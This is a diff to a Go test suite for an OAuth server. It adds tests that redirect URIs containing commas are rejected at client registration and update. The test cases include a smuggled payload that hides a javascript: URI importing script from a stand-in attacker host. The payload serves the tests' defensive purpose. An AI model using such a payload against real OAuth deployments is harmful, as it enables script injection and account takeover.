@@ -400,13 +400,28 @@ func (ts *OAuthServiceTestSuite) TestRedirectURIValidation() {
 			shouldError: true,
 			errorMsg:    "is not allowed for security reasons",
 		},
+		// Commas would split into several URIs once stored
+		{
+			name:        "Invalid comma hiding a javascript URI",
+			uri:         "https://attacker.example/cb,javascript:import('https://attacker.example/x.js')//",
+			shouldError: true,
+			errorMsg:    "must not contain ','",
+		},
+		{
+			name:        "Invalid comma joining two https URIs",
+			uri:         "https://a.example/cb,https://b.example/cb",
+			shouldError: true,
+			errorMsg:    "must not contain ','",
+		},
 	}
 
 	for _, tc := range testCases {
 		ts.T().Run(tc.name, func(t *testing.T) {
 			err := validateRedirectURI(tc.uri)
 			if tc.shouldError {
-				assert.Error(t, err)
+				if !assert.Error(t, err) {
+					return
+				}
 				if tc.errorMsg != "" {
 					assert.Contains(t, err.Error(), tc.errorMsg)
 				}
@@ -415,6 +430,35 @@ func (ts *OAuthServiceTestSuite) TestRedirectURIValidation() {
 			}
 		})
 	}
+}
+
+func (ts *OAuthServiceTestSuite) TestRedirectURIWithCommaRejected() {
+	ctx := context.Background()
+	smuggled := []string{"https://attacker.example/cb,javascript:import('https://attacker.example/x.js')//"}
+
+	client, _, err := ts.Server.registerOAuthServerClient(ctx, &OAuthServerClientRegisterParams{
+		ClientName:       "Comma Client",
+		RedirectURIs:     smuggled,
+		RegistrationType: "dynamic",
+	})
+	require.Error(ts.T(), err)
+	assert.Nil(ts.T(), client)
+	assert.Contains(ts.T(), err.Error(), "must not contain ','")
+
+	count, err := ts.DB.Count(&models.OAuthServerClient{})
+	require.NoError(ts.T(), err)
+	assert.Equal(ts.T(), 0, count)
+
+	existing, _ := ts.createTestOAuthClient()
+	_, err = ts.Server.updateOAuthServerClient(ctx, existing.ID, &OAuthServerClientUpdateParams{
+		RedirectURIs: &smuggled,
+	})
+	require.Error(ts.T(), err)
+	assert.Contains(ts.T(), err.Error(), "must not contain ','")
+
+	reloaded, err := models.FindOAuthServerClientByID(ts.DB, existing.ID)
+	require.NoError(ts.T(), err)
+	assert.Equal(ts.T(), existing.GetRedirectURIs(), reloaded.GetRedirectURIs())
 }
 
 func (ts *OAuthServiceTestSuite) TestGrantTypeDefaults() {
